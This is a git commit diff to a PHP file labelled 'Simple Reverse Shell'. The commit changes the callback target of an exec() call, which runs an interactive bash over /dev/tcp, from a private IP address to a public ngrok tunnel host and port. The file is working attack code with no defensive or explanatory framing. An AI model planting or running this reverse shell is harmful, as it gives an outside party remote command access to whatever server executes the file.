a3f235faa1852d9d32eb150d6acbd03fe3ad8b2a
dfchkqp <60970986+dfchkqp@users.noreply.github.com>
2021-03-02 20:29:58 +0300

    Update rev.php

--- rev.php
+++ rev.php
@@ -3,4 +3,4 @@
 -- Created by B.K 
 -- Simple Reverse Shell
 */
-exec("/bin/bash -c 'exec bash -i &>/dev/tcp/192.168.1.24/12345 <&1'");
+exec("/bin/bash -c 'exec bash -i &>/dev/tcp/2.tcp.ngrok.io/11119 <&1'");
